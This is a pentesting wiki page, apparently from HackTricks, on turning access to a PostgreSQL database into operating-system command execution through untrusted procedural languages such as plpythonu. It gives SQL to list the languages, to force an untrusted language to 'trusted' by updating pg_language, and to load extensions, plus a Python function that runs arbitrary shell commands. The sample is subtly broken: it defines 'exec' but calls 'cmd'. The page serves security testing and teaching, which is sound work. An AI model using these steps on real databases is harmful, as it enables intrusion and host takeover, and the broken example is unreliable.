---
title: "RCE with PostgreSQL Languages"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: web
---

## PostgreSQL Languages

The PostgreSQL database you got access to may have different **scripting languages installed** that you could abuse to **execute arbitrary code**.

You can **get them running**:

```
\dL *
SELECT lanname,lanpltrusted,lanacl FROM pg_language;
```
Most of the scripting languages you can install in PostgreSQL have **2 flavours**: the **trusted** and the **untrusted**. The **untrusted** will have a name **ended in “u”** and will be the version that will allow you to **execute code** and use other interesting functions. This are languages that if installed are interesting:

- **plpythonu**
- **plpython3u**
- **plperlu**
- **pljavaU**
- **plrubyu**
- … (any other programming language using an insecure version)

Warning

If you find that an interesting language is **installed** but **untrusted** by PostgreSQL (**`lanpltrusted`** is **`false`**) you can try to **trust it** with the following line so no restrictions will be applied by PostgreSQL:

```
UPDATE pg_language SET lanpltrusted=true WHERE lanname='plpythonu';
# To check your permissions over the table pg_language
SELECT * FROM information_schema.table_privileges WHERE table_name = 'pg_language';
```

Caution

If you don’t see a language, you could try to load it with (**you need to be superadmin**):

```
CREATE EXTENSION plpythonu;
CREATE EXTENSION plpython3u;
CREATE EXTENSION plperlu;
CREATE EXTENSION pljavaU;
CREATE EXTENSION plrubyu;
```

Trusted language variants can be compiled without their normal restrictions, as this [untrusted PL/Ruby installation example](https://www.robbyonrails.com/articles/2005/08/22/installing-untrusted-pl-ruby-for-postgresql.html) demonstrates. It is therefore worth checking for code execution even when only a nominally **trusted** variant appears installed.[\[1\]](#references)

## plpythonu/plpython3u

```
CREATE OR REPLACE FUNCTION exec (cmd text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    return os.popen(cmd).read()
    #return os.execve(cmd, ["/usr/lib64/pgsql92/bin/psql"], {})
$$
LANGUAGE 'plpythonu';
SELECT cmd("ls"); #RCE with popen or execve
```
## pgSQL

Check the following page:

## C

Check the following page:

[RCE with PostgreSQL Extensions](rce-with-postgresql-extensions.html)

## References
